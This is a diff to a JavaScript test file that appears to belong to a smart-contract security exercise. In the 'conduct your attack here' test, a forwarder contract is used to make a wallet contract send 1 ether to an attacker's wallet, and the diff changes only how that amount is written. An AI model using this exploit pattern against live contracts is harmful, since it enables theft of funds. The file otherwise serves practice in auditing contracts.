@@ -39,7 +39,7 @@ describe(NAME, function () {
     it("conduct your attack here", async function () {
       const ABI = ["function sendEther(address,uint256)"];
       const iface = new ethers.utils.Interface(ABI);
-      const data = iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.BigNumber.from("10").pow(18)]);
+      const data = iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1")]);
       await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
     });
 
